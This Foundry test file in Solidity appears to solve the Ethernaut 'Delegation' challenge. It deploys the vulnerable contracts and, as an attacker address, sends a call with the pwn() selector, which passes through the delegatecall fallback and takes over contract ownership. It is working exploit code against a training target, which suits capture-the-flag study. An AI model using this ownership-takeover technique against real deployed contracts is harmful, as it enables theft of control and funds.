// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Delegation, Delegate} from "../src/Delegation.sol";

contract DelegationAttackTest is Test{
  Delegate delegate;
  Delegation delegation;

  function setUp() public{
    delegate = new Delegate(address(this));
    delegation = new Delegation(address(delegate));
  }

  function testShouldClaimOwnership() public{
    address attacker = makeAddr("attacker");
    vm.deal(attacker, 1 ether);

    assertEq(delegation.owner(), address(this));

    // Attack
    vm.prank(attacker);
    (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
    
    assertTrue(success);
    assertEq(delegation.owner(), attacker);
  }
}